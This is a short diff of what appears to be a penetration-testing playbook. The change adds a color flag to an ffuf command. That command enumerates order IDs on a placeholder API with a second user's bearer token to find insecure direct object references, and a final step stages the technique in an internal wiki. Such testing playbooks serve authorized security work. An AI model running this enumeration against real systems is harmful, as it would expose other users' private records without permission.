@@ -55,7 +55,7 @@ known=48291
 [print(i) for i in range(known-500, known+500)]
 " > ids.txt
 
-ffuf -u "https://target.com/api/v1/orders/FUZZ" \
+ffuf -c -u "https://target.com/api/v1/orders/FUZZ" \
   -w ids.txt -H "Authorization: Bearer USER_B_TOKEN" -mc 200
 ```
 9. **Distill to wiki (when confirmed):** if the finding is a reusable GraphQL IDOR or UUID-bypass technique, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/access-control.md`. Promote later via `scripts/wiki-promote.py`.
